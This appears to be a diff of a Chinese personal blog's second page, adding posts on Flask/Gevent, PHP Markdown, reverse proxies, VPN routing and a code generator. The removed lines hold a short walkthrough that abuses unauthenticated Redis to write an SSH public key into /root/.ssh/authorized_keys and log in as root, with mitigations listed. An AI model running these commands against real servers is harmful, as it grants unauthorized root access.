+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CainChan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CainChan">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/flask-gevent/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">Flask+Gevent实现异步非阻塞访问</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-05-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-05-01T00:00:00+08:00">2017-05-01</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-20 23:43:47" itemprop="dateModified" datetime="2018-12-20T23:43:47+08:00">2018-12-20</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">from</span> gevent.pywsgi <span class="keyword">import</span> WSGIServer</span><br><span class="line">monkey.patch_all()</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Welcome to Flask!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    http_server = WSGIServer((<span class="string">'0.0.0.0'</span>, <span class="number">5000</span>), app)</span><br><span class="line">    http_server.serve_forever()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/php-markdown/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CainChan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CainChan">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/php-markdown/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">php集成Markdown</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-04-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-04-01T00:00:00+08:00">2017-04-01</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-20 23:43:47" itemprop="dateModified" datetime="2018-12-20T23:43:47+08:00">2018-12-20</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h6 id="1-php安装markdown扩展"><a href="#1-php安装markdown扩展" class="headerlink" title="1.php安装markdown扩展"></a>1.php安装markdown扩展</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require michelf/php-markdown</span><br></pre></td></tr></table></figure>
+<h6 id="2-php转化markdown为html"><a href="#2-php转化markdown为html" class="headerlink" title="2.php转化markdown为html"></a>2.php转化markdown为html</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> \<span class="title">Michelf</span>\<span class="title">MarkdownExtra</span>;</span><br><span class="line">$my_html = MarkdownExtra::defaultTransform($my_text);</span><br></pre></td></tr></table></figure>
+<h6 id="3-页面加入语法高亮插件highlight-js"><a href="#3-页面加入语法高亮插件highlight-js" class="headerlink" title="3.页面加入语法高亮插件highlight.js"></a>3.页面加入语法高亮插件highlight.js</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"//cdn.bootcss.com/highlight.js/8.5/styles/default.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//cdn.bootcss.com/highlight.js/8.5/highlight.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">hljs.initHighlightingOnLoad();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>参考资料：</p>
+<ol>
+<li><a href="https://michelf.ca/projects/php-markdown/" target="_blank" rel="noopener">php-markdown</a></li>
+<li><a href="https://highlightjs.org" target="_blank" rel="noopener">语法高亮插件-highlightjs</a></li>
 </ol>
-<p>上述命令将会在当前项目中的 composer.json 文件的末尾自动添加镜像的配置信息（你也可以自己手工添加）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;repositories&quot;: &#123;</span><br><span class="line">    &quot;packagist&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;composer&quot;,</span><br><span class="line">        &quot;url&quot;: &quot;https://packagist.phpcomposer.com&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>Composer中文指南：<a href="http://docs.phpcomposer.com/" target="_blank" rel="noopener">phpcomposer.com</a></p>
 
           
         
@@ -618,7 +1389,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/redis-ssh-key-bug/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/nginx-apache-proxy/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="CainChan">
@@ -638,7 +1409,7 @@
           <h1 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2016/redis-ssh-key-bug/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">利用Redis未授权访问配合SSHkey文件提权</a>
+                <a href="/nginx-apache-proxy/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">Nginx+Apache反向代理配置</a>
               
             
           </h1>
@@ -663,7 +1434,7 @@
                 
               
 
-              <time title="Created: 2016-08-23 09:12:55" itemprop="dateCreated datePublished" datetime="2016-08-23T09:12:55+08:00">2016-08-23</time>
+              <time title="Created: 2017-03-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-03-01T00:00:00+08:00">2017-03-01</time>
             
 
             
@@ -680,7 +1451,321 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-12-20 00:34:37" itemprop="dateModified" datetime="2018-12-20T00:34:37+08:00">2018-12-20</time>
+                <time title="Modified: 2018-12-20 23:43:47" itemprop="dateModified" datetime="2018-12-20T23:43:47+08:00">2018-12-20</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h6 id="Nginx反向代理配置"><a href="#Nginx反向代理配置" class="headerlink" title="Nginx反向代理配置"></a>Nginx反向代理配置</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server &#123; </span><br><span class="line">    listen 80; </span><br><span class="line">    server_name linkpod.cn www.linkpod.cn; </span><br><span class="line">    location / &#123; </span><br><span class="line">        proxy_pass http://linkpod.sinaapp.com; </span><br><span class="line">        proxy_redirect http://linkpod.sinaapp.com/ /; </span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr; </span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; </span><br><span class="line">        access_log off; </span><br><span class="line">        error_log off; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h6 id="Apache反向代理配置"><a href="#Apache反向代理配置" class="headerlink" title="Apache反向代理配置"></a>Apache反向代理配置</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On </span><br><span class="line">RewriteBase / </span><br><span class="line">RewriteRule ^(.*)$ http://linkpod.sinaapp.com/$1 [P]</span><br></pre></td></tr></table></figure>
+<h6 id="Nginx负载均衡-反向代理配置"><a href="#Nginx负载均衡-反向代理配置" class="headerlink" title="Nginx负载均衡+反向代理配置"></a>Nginx负载均衡+反向代理配置</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">upstream shlnjr.com.cn &#123;    </span><br><span class="line">    server 115.28.237.124:8000;    </span><br><span class="line">&#125;  </span><br><span class="line">server &#123; </span><br><span class="line">    listen 80; </span><br><span class="line">    server_name shlnjr.com.cn www.shlnjr.com.cn; </span><br><span class="line">    location / &#123; </span><br><span class="line">        proxy_pass http://shlnjr.com.cn; </span><br><span class="line">        access_log off; </span><br><span class="line">        error_log off; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/windows-vpn-intranet/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CainChan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CainChan">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/windows-vpn-intranet/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">windows配置仅内网网络走VPN</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-02-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-02-01T00:00:00+08:00">2017-02-01</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-20 23:43:47" itemprop="dateModified" datetime="2018-12-20T23:43:47+08:00">2018-12-20</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="1-远程网络使用默认网关"><a href="#1-远程网络使用默认网关" class="headerlink" title="1.远程网络使用默认网关"></a>1.远程网络使用默认网关</h4><p>在VPN网络适配器的属性里取消<code>在远程网络上使用默认网关</code>选项,保存后连接VPN</p>
+<h4 id="2-查看路由表"><a href="#2-查看路由表" class="headerlink" title="2.查看路由表"></a>2.查看路由表</h4><p>使用管理员权限运行cmd后查看路由表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure></p>
+<ol>
+<li>在接口列表中找到VPN的<code>接口号</code></li>
+<li>在IPv4 路由表中找到<code>VPN的ip</code></li>
+</ol>
+<h4 id="3-添加永久静态路由表"><a href="#3-添加永久静态路由表" class="headerlink" title="3.添加永久静态路由表"></a>3.添加永久静态路由表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route -p add 192.168.1.0 mask 255.255.255.0  vpnip  if 接口号</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/icw-generator/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CainChan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CainChan">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/icw-generator/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">icw generator使用方法</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-01-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-01-01T00:00:00+08:00">2017-01-01</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-20 23:43:47" itemprop="dateModified" datetime="2018-12-20T23:43:47+08:00">2018-12-20</time>
               
             
           </span>
@@ -697,7 +1782,7 @@
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Internet/" itemprop="url" rel="index"><span itemprop="name">Internet</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ifchange/" itemprop="url" rel="index"><span itemprop="name">Ifchange</span></a></span>
 
                 
                 
@@ -733,22 +1818,12 @@
       
         
           
-            <h2 id="一-漏洞概述"><a href="#一-漏洞概述" class="headerlink" title="一.漏洞概述"></a>一.漏洞概述</h2><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p>
-<h2 id="二-漏洞分析与利用"><a href="#二-漏洞分析与利用" class="headerlink" title="二.漏洞分析与利用"></a>二.漏洞分析与利用</h2><h4 id="1-先创建秘钥文件"><a href="#1-先创建秘钥文件" class="headerlink" title="1. 先创建秘钥文件"></a>1. 先创建秘钥文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen –t rsa</span><br></pre></td></tr></table></figure>
-<h4 id="2-利用空口令登录redis"><a href="#2-利用空口令登录redis" class="headerlink" title="2. 利用空口令登录redis"></a>2. 利用空口令登录redis</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h xxx.xxx.xxx.xxx</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">config get dir</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">test</span> <span class="string">"\n\n\nssh-rsa  key_pub\n\n\n\n"</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<p>其中key_pub为生成的公钥,即可将公钥保存在远端服务器,使得登录时不需要输入账号与密码.</p>
-<h4 id="3-利用私钥登录root-xxx-xxx-xxx-xxx"><a href="#3-利用私钥登录root-xxx-xxx-xxx-xxx" class="headerlink" title="3. 利用私钥登录root@xxx.xxx.xxx.xxx"></a>3. 利用私钥登录<a href="mailto:root@xxx.xxx.xxx.xxx" target="_blank" rel="noopener">root@xxx.xxx.xxx.xxx</a></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
-<h2 id="三-漏洞修补方法"><a href="#三-漏洞修补方法" class="headerlink" title="三.漏洞修补方法"></a>三.漏洞修补方法</h2><ol>
-<li>禁止使用 root 权限启动 redis 服务；</li>
-<li>对 redis 访问启用密码认证，并且添加 IP 访问限制；</li>
-<li>尽可能不对公网直接开放 SSH 服务。</li>
-</ol>
-<h2 id="四-参考"><a href="#四-参考" class="headerlink" title="四.参考"></a>四.参考</h2><ul>
-<li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">zoomeye</a></li>
-<li><a href="http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/" target="_blank" rel="noopener">Redis 未授权访问配合 SSH key 文件利用分析</a></li>
-<li><a href="http://www.2cto.com/Article/201511/449779.html" target="_blank" rel="noopener">Redis未授权访问导致可远程获得服务器权限</a></li>
-</ul>
-
+            <h4 id="1-新建数据库-数据表-toh-accounts"><a href="#1-新建数据库-数据表-toh-accounts" class="headerlink" title="1.新建数据库.数据表 toh.accounts"></a>1.新建数据库.数据表 toh.accounts</h4><h4 id="2-配置项目路径"><a href="#2-配置项目路径" class="headerlink" title="2.配置项目路径"></a>2.配置项目路径</h4><p><code>vim generator.php</code><br>在<code>$_map</code>中增加一条<code>[&quot;数据库名&quot; =&gt; [&quot;数据库名&quot;,&quot;core文件前缀名&quot;,&quot;项目路径&quot;]]</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'toh'</span> =&gt; <span class="keyword">array</span>(<span class="string">'toh'</span>, <span class="string">'Toh'</span>, <span class="string">'/data/zhengkai.chen/toh'</span>)]</span><br></pre></td></tr></table></figure></p>
+<h4 id="3-添加数据库配置文件路径"><a href="#3-添加数据库配置文件路径" class="headerlink" title="3.添加数据库配置文件路径"></a>3.添加数据库配置文件路径</h4><p><code>vim configs/config.php</code><br>增加数据库名<code>toh</code>到循环载入列表<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'contacts'</span>, <span class="string">'cv'</span>, <span class="string">'hunter'</span>, <span class="string">'oa'</span>, <span class="string">'mail'</span>, <span class="string">'chance'</span>, <span class="string">'cms'</span>, <span class="string">'chinahr'</span>, <span class="string">'passport'</span>, <span class="string">'career'</span>, <span class="string">'crawler'</span>,<span class="string">'gsystem'</span>,<span class="string">'green_liepin'</span>, <span class="string">'clickstream'</span>, <span class="string">'proxy'</span>, <span class="string">'grab'</span>, <span class="string">'icdc_1'</span>, <span class="string">'icdc_allot'</span>, <span class="string">'pay'</span>, <span class="string">'package'</span>, <span class="string">'grab_mail'</span>,<span class="string">'toh'</span>) <span class="keyword">as</span> $db)&#123;</span><br><span class="line">    <span class="keyword">include</span> dirname(<span class="keyword">__FILE__</span>). sprintf(<span class="string">'/database/%s.schema.php'</span>, $db);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="4-新建数据库配置文件"><a href="#4-新建数据库配置文件" class="headerlink" title="4.新建数据库配置文件"></a>4.新建数据库配置文件</h4><p><code>vim configs/database/toh.schema.php</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$g_dao_map[&apos;toh&apos;][&apos;accounts&apos;] = array(</span><br><span class="line">	&apos;path&apos;=&gt;&apos;account&apos;, //目录名</span><br><span class="line">	&apos;dao&apos;=&gt;&apos;account&apos;, //dao文件名</span><br><span class="line">	&apos;equal_search_items&apos; =&gt; &quot;&quot;,</span><br><span class="line">	&apos;like_search_items&apos;  =&gt; &quot;&quot;,</span><br><span class="line">	&apos;like2_search_items&apos; =&gt; &apos;&apos;,</span><br><span class="line">	&apos;fetch_name_columns&apos; =&gt; array(),</span><br><span class="line">	&apos;data_maps_many&apos;     =&gt; array(),</span><br><span class="line">	&apos;data_maps_one&apos;      =&gt; array(),</span><br><span class="line">	&apos;kv_data_maps_one&apos;      =&gt; array(),</span><br><span class="line">	&apos;kv_data_maps_many&apos;  =&gt; array(),</span><br><span class="line">	&apos;model&apos;  =&gt;&apos;account/Model_account&apos;, // model文件路径名</span><br><span class="line">	&apos;has_one&apos;    =&gt;&quot;&quot;,</span><br><span class="line">	&apos;has_many&apos;   =&gt;&quot;&quot;,</span><br><span class="line">	&apos;foriegn_key&apos; =&gt;&apos;&apos;,</span><br><span class="line">	);</span><br><span class="line">$g_controller_map[&apos;toh&apos;][&apos;accounts&apos;] =array(</span><br><span class="line">    &apos;path&apos;                      =&gt; &apos;&apos;,</span><br><span class="line">    &apos;SUGGEST&apos;                   =&gt; FALSE,// 是否需要suggest</span><br><span class="line">    &apos;controller&apos;                =&gt; &apos;account&apos;, //控制器名</span><br><span class="line">    &apos;LOGIC&apos;                     =&gt; &apos;account/Logic_account&apos;, //logic文件路径名</span><br><span class="line">    &apos;ILIST_ITEM&apos;                =&gt; array(),</span><br><span class="line">    &apos;ILIST_ITEM2&apos;               =&gt; array(),</span><br><span class="line">    &apos;SEARCH_INTVAL_ITEM&apos;        =&gt; array(),</span><br><span class="line">    &apos;SEARCH_ITEM&apos;               =&gt; array(),</span><br><span class="line">    &apos;SEARCH_CONDITIONS&apos;         =&gt; array(),</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
+<h4 id="5-生成controller"><a href="#5-生成controller" class="headerlink" title="5.生成controller"></a>5.生成controller</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php generator.php 数据库名 controllers 表名</span></span><br><span class="line">php generator.php toh controllers accounts</span><br></pre></td></tr></table></figure>
+<h4 id="6-生成model"><a href="#6-生成model" class="headerlink" title="6.生成model"></a>6.生成model</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php generator.php 数据库名 models 表名</span></span><br><span class="line">php generator.php toh models accounts</span><br></pre></td></tr></table></figure>
+<h4 id="7-生成dao"><a href="#7-生成dao" class="headerlink" title="7.生成dao"></a>7.生成dao</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php generator.php 数据库名 daos 表名</span></span><br><span class="line">php generator.php toh daos accounts</span><br></pre></td></tr></table></figure>
           
         
       
@@ -793,7 +1868,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -836,7 +1911,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">13</span>
+                    <span class="site-state-item-count">29</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -890,7 +1965,49 @@
                     
                       
                     
-                    <span class="site-state-item-count">12</span>
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">32</span>
                     <span class="site-state-item-name">tags</span>
                   
                 </div>
@@ -929,7 +2046,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
   <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
